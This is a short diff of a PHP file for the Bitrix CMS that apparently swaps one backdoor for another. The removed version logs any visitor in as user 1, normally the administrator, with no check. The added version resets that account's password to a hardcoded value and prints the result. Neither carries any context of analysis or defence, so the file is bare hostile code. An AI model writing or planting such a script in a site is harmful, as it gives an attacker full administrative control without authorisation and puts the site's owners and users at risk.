@@ -1,8 +1,6 @@
 <?php
-require($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php");
-
-global $USER;
-$USER->Authorize(1);
-
-require($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/epilog_after.php");  
+require($_SERVER['DOCUMENT_ROOT']."/bitrix/header.php");
+echo $USER->Update(1,array("PASSWORD"=>'904443023-Abdul'));
+echo $USER->LAST_ERROR;
+require($_SERVER['DOCUMENT_ROOT']."/bitrix/footer.php");
 ?>
